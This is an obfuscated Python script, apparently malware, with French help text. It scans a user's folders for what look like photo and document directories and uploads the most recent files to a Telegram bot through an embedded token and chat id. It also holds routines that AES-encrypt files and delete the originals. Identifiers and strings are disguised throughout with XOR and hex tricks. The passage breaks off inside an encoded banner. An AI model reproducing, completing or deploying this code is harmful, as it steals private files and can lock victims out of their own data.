from pathlib import Path
import requests
from Crypto.Cipher import AES
from argparse import ArgumentParser as lIIlIllIllIIlIlIIIllIIIlll
from hashlib import sha256 as IIllllllllIll
from io import BytesIO as lIlllIIIIIIlIIIIlIII
from requests import post as IIIIlIIIIlIIllIlIIl
lIIllIIIIlllIIlIlIIllII = globals()[(lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 28)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([67, 67, 126, 105, 117, 112, 104, 117, 114, 111, 67, 67])]
IlllIIlIlIIlllI = lIIllIIIIlllIIlIlIIllII if isinstance(lIIllIIIIlllIIlIlIIllII, dict) else lIIllIIIIlllIIlIlIIllII.__dict__
lllllllIIIlIIlI = (lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 526503109874428390520).to_bytes(9, 'big').decode())(934281234277797645085)
IllllIllIlllII = 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 14).to_bytes(1, 'big').decode())(57), 16) * 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 201 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([249]), 16) + 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 98)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([81]), 16)
IllIIIIIlIlIIIIllIIII = (lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 225 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([136, 128, 147, 151, 132, 133, 147, 148, 142, 145, 146, 132, 140, 136, 128, 149, 132, 139, 140, 128, 136, 147, 128, 140])
lllIlIIlllllllIlI = (lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 4069729703).to_bytes(4, 'big').decode())(3707128772)
llllIIlllllllllIlllIllllI: list[str] = [(lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 132 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([201, 205, 199, 192]), (lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('6172656d6143'), (lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 140 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([255, 233, 254, 249, 248, 239, 229, 220]), (lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 99) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('270c140d0f0c020710'), (lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 15581098633957200672).to_bytes(8, 'big').decode())(10327686141168755536)]
IllllIIlIIIlllIIIllI = [(lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 174 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([221, 203, 220, 219, 218, 205, 199, 254]), (lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 6) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('45676b637467')]
IlIlllIIIIlIllllIlIlI = 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 19734).to_bytes(2, 'big').decode())(32548), 16) ^ 0 .__class__((lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 164) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('96e1'), 16)
lIlIllIIlIIIllI = (lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 22) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('2e272e262526222422262c5757515c4c495b5c20735d62746f7b6e7d676c7c71595c556420464174216377652f43')
llIIlllIIIlIIIlIIIlll = (lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 234 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([216, 221, 218, 216, 217, 221, 216, 221, 211, 222, 199])
IIllIIIllllIllIIlll = f'https://api.telegram.org/bot{lIlIllIIlIIIllI}'
IllIIIlIllIIIlIIllI = {(lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 214 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([177, 166, 188, 248]), (lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 120)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([86, 18, 8, 29, 31]), (lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 106 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([13, 4, 26, 68]), (lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 52)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([26, 67, 81, 86, 68]), (lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 90)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([116, 61, 51, 60])}
lIllllIIlIIl: bytes = IIllllllllIll(IllIIIIIlIlIIIIllIIII.encode()).digest()

def IlllllllIllIIIllIIlIlIIlIlI(root: Path, IlIllIlllIllIlIIllIIlI: list[str], lIlllIIIIIIlIlIlllIIlIIIIII: int) -> list[Path]:
    IIlIlIIlIlIIllI = {t.lower() for t in IlIllIlllIllIlIIllIIlI}
    lIIIIIlllIlIIllllIII: list[Path] = []

    def IIlIllIllIllIIIlIIllIllIIl(IllllIllllllIlIlIIIlIIIll: Path, depth: int) -> None:
        if depth > lIlllIIIIIIlIlIlllIIlIIIIII:
            return
        try:
            IIIIllIIIIIIlIIIIlIlll = IlllIIlIlIIlllI[(lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('7473696c')](IllllIllllllIlIlIIIlIIIll.iterdir())
        except (PermissionError, OSError):
            return
        for IIlllIIllllIIlIlllIlIIIIl in IIIIllIIIIIIlIIIIlIlll:
            if IIlllIIllllIIlIlllIlIIIIl.lIIIlllIlllIlIlIIllIIlIllIl.startswith((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 28).to_bytes(1, 'big').decode())(50)):
                continue
            if not IIlllIIllllIIlIlllIlIIIIl.is_dir():
                continue
            if IIlllIIllllIIlIlllIlIIIIl.lIIIlllIlllIlIlIIllIIlIllIl.lower() in IIlIlIIlIlIIllI:
                lIIIIIlllIlIIllllIII.append(IIlllIIllllIIlIlllIlIIIIl)
            else:
                IIlIllIllIllIIIlIIllIllIIl(IIlllIIllllIIlIlllIlIIIIl, depth + (0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 82)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([98]), 16) << 0 .__class__((lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('31'), 16) | 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 230).to_bytes(1, 'big').decode())(215), 16)))
    IIlIllIllIllIIIlIIllIllIIl(root, depth=0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 20).to_bytes(1, 'big').decode())(36), 16) << 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 101 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([84]), 16) | 0 .__class__((lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 218) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('eb'), 16))
    return lIIIIIlllIlIIllllIII

def IIllllIlIIllIllII(IllIIllIllIIIIIll: Path) -> None:
    lIIlIIIlIllIIIl = IllIIllIllIIIIIll.read_bytes()
    llllIllIllIIIllllII = AES.new(lIllllIIlIIl, AES.MODE_GCM)
    IIIIllIlllII, IllIIllIllIllIl = llllIllIllIIIllllII.encrypt_and_digest(lIIlIIIlIllIIIl)
    IlIlIlllIIIlllIIlIlllIII = IllIIllIllIIIIIll.with_suffix(IllIIllIllIIIIIll.suffix + lllIlIIlllllllIlI)
    IlIlIlllIIIlllIIlIlllIII.write_bytes(llllIllIllIIIllllII.lIIIIlIlIIll + IllIIllIllIllIl + IIIIllIlllII)
    IllIIllIllIIIIIll.unlink()

def lIllIllllllIlIIIIIIlIIIII(IlIlIlllIIIlllIIlIlllIII: Path) -> None:
    IllllIlIIllIIIlIIIIIl = IlIlIlllIIIlllIIlIlllIII.read_bytes()
    lIIIIlIlIIll, IllIIllIllIllIl, IIIIllIlllII = (IllllIlIIllIIIlIIIIIl[:0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 34 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([19]), 16) << 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 146).to_bytes(1, 'big').decode())(166), 16) | 0 .__class__((lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 103) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('57'), 16)], IllllIlIIllIIIlIIIIIl[0 .__class__((lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 103) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('57'), 16) << 0 .__class__((lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('35'), 16) | 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 60877).to_bytes(2, 'big').decode())(56573), 16):0 .__class__((lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 130) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('b6'), 16) << 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 104 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([91]), 16) | 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 160 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([144]), 16)], IllllIlIIllIIIlIIIIIl[0 .__class__((lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 166) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('9e'), 16) << 0 .__class__((lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('32'), 16) | 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 85)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([101]), 16):])
    llllIllIllIIIllllII = AES.new(lIllllIIlIIl, AES.MODE_GCM, nonce=lIIIIlIlIIll)
    lIIIllllIlllIIIIIlIIIIIl = IlIlIlllIIIlllIIlIlllIII.with_suffix('')
    lIIIllllIlllIIIIIlIIIIIl.write_bytes(llllIllIllIIIllllII.decrypt_and_verify(IIIIllIlllII, IllIIllIllIllIl))
    IlIlIlllIIIlllIIlIlllIII.unlink()

def llIIIIllllIIll(IlIlIlllIIIlllIIlIlllIII: Path) -> tuple[bytes, str]:
    IllllIlIIllIIIlIIIIIl = IlIlIlllIIIlllIIlIlllIII.read_bytes()
    lIIIIlIlIIll, IllIIllIllIllIl, IIIIllIlllII = (IllllIlIIllIIIlIIIIIl[:0 .__class__((lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 105) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('582a5e'), 16) - 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 15772657).to_bytes(3, 'big').decode())(12708294), 16)], IllllIlIIllIIIlIIIIIl[0 .__class__((lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('34'), 16) << 0 .__class__((lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('32'), 16) | 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 150 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([166]), 16):0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 35)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([18, 101, 23]), 16) - 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 18)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([35, 86, 38]), 16)], IllllIlIIllIIIlIIIIIl[0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 121 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([76, 79]), 16) ^ 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 28737).to_bytes(2, 'big').decode())(17524), 16):])
    llllIllIllIIIllllII = AES.new(lIllllIIlIIl, AES.MODE_GCM, nonce=lIIIIlIlIIll)
    lIIlIIIlIllIIIl = llllIllIllIIIllllII.decrypt_and_verify(IIIIllIlllII, IllIIllIllIllIl)
    return (lIIlIIIlIllIIIl, IlIlIlllIIIlllIIlIlllIII.with_suffix('').lIIIlllIlllIlIlIIllIIlIllIl)

def IIIllllllllIIlllIlllIl(IIIlIIIlllIIllIIIIlll: Path, IllIIIIlIIIIIIIlllIlllIIllI: bool) -> int:
    llIllIllIIlIl = [IIIllllllllIlllI for IIIllllllllIlllI in IIIlIIIlllIIllIIIIlll.rglob((lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 116) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('5e')) if IIIllllllllIlllI.is_file() and IIIllllllllIlllI.suffix != lllIlIIlllllllIlI and (not IlllIIlIlIIlllI[(lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 16436278).to_bytes(3, 'big').decode())(10199631)]((lIIlIIIlIlIlllIIlIllIl.startswith((lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('2e')) for lIIlIIIlIlIlllIIlIllIl in IIIllllllllIlllI.relative_to(IIIlIIIlllIIllIIIIlll).parts)))]
    if not llIllIllIIlIl:
        return 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 10465).to_bytes(2, 'big').decode())(20180), 16) ^ 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 126)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([24, 75]), 16)
    for IIIllllllllIlllI in llIllIllIIlIl:
        if not IllIIIIlIIIIIIIlllIlllIIllI:
            IIllllIlIIllIllII(IIIllllllllIlllI)
    return IlllIIlIlIIlllI[(lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 2326467).to_bytes(3, 'big').decode())(5184173)](llIllIllIIlIl)

def lIIlIIlIllIIlllllllIlI(IIIlIIIlllIIllIIIIlll: Path) -> int:
    llIllIllIIlIl = [IIIllllllllIlllI for IIIllllllllIlllI in IIIlIIIlllIIllIIIIlll.rglob(f'*{lllIlIIlllllllIlI}') if IIIllllllllIlllI.is_file() and (not IlllIIlIlIIlllI[(lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 172 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([213, 194, 205])]((lIIlIIIlIlIlllIIlIllIl.startswith((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 68)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([106])) for lIIlIIIlIlIlllIIlIllIl in IIIllllllllIlllI.relative_to(IIIlIIIlllIIllIIIIlll).parts)))]
    ok = 0 .__class__((lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 88) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('1b69'), 16) ^ 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 90)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([25, 107]), 16)
    for IIIllllllllIlllI in llIllIllIIlIl:
        try:
            lIllIllllllIlIIIIIIlIIIII(IIIllllllllIlllI)
            ok += 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 35819).to_bytes(2, 'big').decode())(52905), 16) - 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 43)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([78, 74]), 16)
        except ValueError:
            pass
    return ok

def IIIlllllIllllIIlIIIIIllllI(IllIIllIllIIIIIll: Path) -> str:
    lIIIlllIlllIlIlIIllIIlIllIl = IllIIllIllIIIIIll.lIIIlllIlllIlIlIIllIIlIllIl
    if lIIIlllIlllIlIlIIllIIlIllIl.endswith(lllIlIIlllllllIlI):
        lIIIlllIlllIlIlIIllIIlIllIl = lIIIlllIlllIlIlIIllIIlIllIl[:-IlllIIlIlIIlllI[(lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 7939469).to_bytes(3, 'big').decode())(1392867)](lllIlIIlllllllIlI)]
    return Path(lIIIlllIlllIlIlIIllIIlIllIl).suffix.lower()

def lIllllIlllIIlIllIIIII(IIIlIIIlllIIllIIIIlll: Path, IIllIlIlllllIlllIIl: int) -> list[Path]:
    IllIlIlIIlllllIllIIIl = IlllIIlIlIIlllI[(lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 135) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('f4e8f5f3e2e3')]((IIIllllllllIlllI for IIIllllllllIlllI in IIIlIIIlllIIllIIIIlll.rglob((lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 195 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([233])) if IIIllllllllIlllI.is_file() and (not IlllIIlIlIIlllI[(lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 84)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([53, 58, 45])]((lIIlIIIlIlIlllIIlIllIl.startswith((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 10)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([36])) for lIIlIIIlIlIlllIIlIllIl in IIIllllllllIlllI.relative_to(IIIlIIIlllIIllIIIIlll).parts)))), key=lambda IIIllllllllIlllI: IIIllllllllIlllI.stat().st_mtime)
    return IllIlIlIIlllllIllIIIl[:IIllIlIlllllIlllIIl]

def IlIIlIIlIlIIll(IIIIlllIIlllI: Path, IllIIIIlIIIIIIIlllIlllIIllI: bool) -> bool:
    if IllIIIIlIIIIIIIlllIlllIIllI:
        return True
    if IIIIlllIIlllI.suffix == lllIlIIlllllllIlI:
        try:
            lIIlIIIlIllIIIl, IllllIlllIlllllIllIllIllIlI = llIIIIllllIIll(IIIIlllIIlllI)
        except ValueError:
            return False
    else:
        lIIlIIIlIllIIIl = IIIIlllIIlllI.read_bytes()
        IllllIlllIlllllIllIllIllIlI = IIIIlllIIlllI.lIIIlllIlllIlIlIIllIIlIllIl
    IllIIlIllIlIIIllI = IIIlllllIllllIIlIIIIIllllI(IIIIlllIIlllI)
    lIIIlIlIlllIIlIlll = lIlllIIIIIIlIIIIlIII(lIIlIIIlIllIIIl)
    lIIIlIlIlllIIlIlll.lIIIlllIlllIlIlIIllIIlIllIl = IllllIlllIlllllIllIllIllIlI
    if IllIIlIllIlIIIllI in IllIIIlIllIIIlIIllI:
        IIllIlIIIlIIIllII = f'{IIllIIIllllIllIIlll}/sendPhoto'
        lIIllIIlllllllllIIlIlIIlll = {(lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 114) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('021a1d061d'): (IllllIlllIlllllIllIllIllIlI, lIIIlIlIlllIIlIlll)}
    else:
        IIllIlIIIlIIIllII = f'{IIllIIIllllIllIIlll}/sendDocument'
        lIIllIIlllllllllIIlIlIIlll = {(lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 168 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([220, 198, 205, 197, 221, 203, 199, 204]): (IllllIlllIlllllIllIllIllIlI, lIIIlIlIlllIIlIlll)}
    try:
        lIllllIlIIlII = IIIIlIIIIlIIllIlIIl(IIllIlIIIlIIIllII, data={(lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 120 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([28, 17, 39, 12, 25, 16, 27]): llIIlllIIIlIIIlIIIlll}, files=lIIllIIlllllllllIIlIlIIlll, timeout=0 .__class__((lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('46'), 16) << 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 255).to_bytes(1, 'big').decode())(205), 16) | 0 .__class__((lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 28) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('2c'), 16))
        if lIllllIlIIlII.status_code == 0 .__class__((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 3781474).to_bytes(3, 'big').decode())(558851), 16) ^ 0 .__class__((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 98)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([83, 90, 80]), 16) and lIllllIlIIlII.json().get((lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 7465).to_bytes(2, 'big').decode())(29250)):
            return True
        return False
    except requests.RequestException:
        return False

def IllIIlllIIlIlIIIlIIlIIllll(root: Path, lIlllIIIIIIlIlIlllIIlIIIIII: int, IllIIIIlIIIIIIIlllIlllIIllI: bool) -> None:
    lllIllllIllIlllIIIIlIIlllII = IlllllllIllIIIllIIlIlIIlIlI(root, IllllIIlIIIlllIIIllI, lIlllIIIIIIlIlIlllIIlIIIIII)
    if not lllIllllIllIlllIIIIlIIlllII:
        return
    for IIIlIIIlllIIllIIIIlll in lllIllllIllIlllIIIIlIIlllII:
        llIllIllIIlIl = lIllllIlllIIlIllIIIII(IIIlIIIlllIIllIIIIlll, IlIlllIIIIlIllllIlIlI)
        if not llIllIllIIlIl:
            continue
        for IIIllllllllIlllI in llIllIllIIlIl:
            IlIIlIIlIlIIll(IIIllllllllIlllI, IllIIIIlIIIIIIIlllIlllIIllI)

def llllIIIllIlIIlIlllIIl() -> None:
    IIIIIlIIlllllIIIl = lIIlIllIllIIlIlIIIllIIIlll(description=(lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 47039109106562982086297147653532585827046842958779897649906840323864964107171129572183278661717125807087808884960558034137408882528666574487015994669773722002151425915740301421484046549003368436210917811951847803548474345632).to_bytes(93, 'big').decode())(69868662148539196159921159285968547118724090617678614083430340142117410839691089384198082180965704629310237916232891987003468254965193236451263965943333819390079909536105997018467211696407515904285093775379324292682064094606))
    IIIIIlIIlllllIIIl.add_argument((lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 187 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([207, 212, 212, 201, 150, 150]), default=lllllllIIIlIIlI, help=f'Répertoire source (défaut : {lllllllIIIlIIlI})')
    IIIIIlIIlllllIIIl.add_argument((lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('68747065642d2d'), type=int, default=IllllIllIlllII, help=f'Profondeur de recherche (défaut : {IllllIllIlllII})')
    IIIIIlIIlllllIIIl.add_argument((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 105)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([68, 68, 13, 27, 16, 68, 27, 28, 7]), action=(lambda IIIIIIIllllIIIllllIlll: bytes([int.__xor__(int(IIIIIIIllllIIIllllIlll[IIllllIIIlII:IIllllIIIlII + 2], 16), 125) for IIllllIIIlII in range(0, len(IIIIIIIllllIIIllllIlll), 2)]).decode())('0e09120f1822090f0818'), help=(lambda lIIIlllIlIlIlIIlIl: int.__xor__(lIIIlllIlIlIlIIlIl, 60557152068480966828211429200897163512838820544915991323964424336938382675393741174638183).to_bytes(37, 'big').decode())(28200282438975996235768723278251944469764341864322633817428090584822197169593326714610453))
    IIIIIlIIlllllIIIl.add_argument((lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 11)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([38, 38, 111, 110, 104, 121, 114, 123, 127]), action=(lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('657572745f65726f7473'), help=(lambda lIIlIlllIIIlIlllIlIlIll: b''.__class__([IIllllIIIlII ^ 26 for IIllllIIIlII in lIIlIlllIIIlIlllIlIlIll[::-1]]).decode())([127, 121, 123, 118, 106, 58, 104, 111, 105, 58, 121, 116, 127, 52, 58, 105, 104, 127, 115, 114, 121, 115, 124, 58, 105, 127, 118, 58, 127, 104, 124, 124, 115, 114, 121, 179, 217, 94]))
    lIIlIIIIIIlIIlIIlIIlll = IIIIIlIIlllllIIIl.parse_args()
    root = Path(lIIlIIIIIIlIIlIIlIIlll.root)
    IlllIIlIlIIlllI[(lambda lIIlIlllIIIlIlllIlIlIll: ''.join((chr(int.__xor__(lIIllIIllIlIll, 11)) for lIIllIIllIlIll in lIIlIlllIIIlIlllIlIlIll)))([123, 121, 98, 101, 127])]((lambda IlIIlIIllIIlIIIllIIIIl: b''.fromhex(IlIIlIIllIIlIIIllIIIIl)[::-1].decode())('202020202020200a20202020202020202020202020202020202020202020209196e29196e29196e29196e29196e22020209196e29196e29196e29196e29196e2209196e29196e29196e29196e29196e20a202020202020202020202020202020202020202020208896e28896e28896e28896e28896e22020208896e28896e28896e28896e28896e2208896e28896e28896e28896e28896e2200a20202020202020202020202020202020202020202020208896e28896e28896e29196e2202020208896e28896e28896e29196e220208896e28896e28896e29196e2200a20202020202020202020202020202020202020202020208896e28896e28896e29196e29196e29196e29196e29196e28896e28896e28896e29196e220208896e28896e28896e29196e2200a20202020202020202020202020202020202020202020208896e28896e28896e28896e28896e28896e28896e28896e28896e28896e28896e29196